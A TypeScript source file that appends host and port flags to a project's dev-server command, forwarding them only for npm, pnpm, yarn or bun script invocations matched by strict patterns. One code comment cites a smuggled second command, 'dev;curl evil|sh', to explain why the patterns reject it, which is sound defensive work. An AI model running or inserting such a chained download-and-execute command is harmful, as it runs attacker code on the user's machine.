/**
 * What to run when a project has a site but names no dev server. Not a schema
 * default: `base44 dev` reads an absent `serveCommand` as "no frontend to run
 * here", so only a command that exists purely to serve one may assume this.
 */
export const DEFAULT_SERVE_COMMAND = "npm run dev";

/** What most dev servers call the bind-address flag. Next spells it `--hostname`
 * and exits on `--host`, which is what `site.devHostFlag` is for. */
const DEFAULT_HOST_FLAG = "--host";

// A script name and a `--prefix` path, as charsets rather than `\S+`: the latter
// matches `dev;curl evil|sh`, so the predicate would answer "yes, this forwards
// arguments" for a line whose second command is what receives them.
const SCRIPT = "[A-Za-z0-9:_.-]+";
const PREFIX = "[A-Za-z0-9._/-]+";

// Each package manager that forwards extra arguments to the script it runs, and
// what it needs between the script and those arguments. npm consumes them itself
// without `--`; the other three pass anything after the script name straight
// through. A bare binary (`vite`, `next dev`) is absent on purpose — it would
// read a literal `--` as its own argument.
const SCRIPT_RUNNERS: { pattern: RegExp; separator: string }[] = [
  {
    pattern: new RegExp(
      String.raw`^npm(\s+--prefix\s+${PREFIX})?\s+run\s+${SCRIPT}$`,
    ),
    separator: " -- ",
  },
  {
    pattern: new RegExp(String.raw`^(?:pnpm|yarn|bun)(\s+run)?\s+${SCRIPT}$`),
    separator: " ",
  },
];

interface ServeAddress {
  /** Address to bind, e.g. `0.0.0.0` so something outside the machine can reach it. */
  host?: string;
  port?: number;
  /** How this dev server spells its bind-address flag. */
  hostFlag?: string;
}

function runnerFor(serveCommand: string) {
  return SCRIPT_RUNNERS.find((runner) => runner.pattern.test(serveCommand));
}

/**
 * `serveCommand` with a bind address appended, and whether the address had to be
 * dropped because the command is not a shape arguments can be forwarded through.
 *
 * Returned together so a caller cannot mistake "there was no address to append"
 * for "the address went nowhere" — the difference between the two is a preview
 * that never loads.
 */
export function withServeAddress(
  serveCommand: string,
  { host, port, hostFlag }: ServeAddress,
): { command: string; droppedAddress: boolean } {
  const command = serveCommand.trim();
  const args = [
    ...(host ? [hostFlag ?? DEFAULT_HOST_FLAG, host] : []),
    ...(port === undefined ? [] : ["--port", String(port)]),
  ];
  if (args.length === 0) {
    return { command, droppedAddress: false };
  }
  const runner = runnerFor(command);
  if (!runner) {
    return { command, droppedAddress: true };
  }
  return {
    command: `${command}${runner.separator}${args.join(" ")}`,
    droppedAddress: false,
  };
}
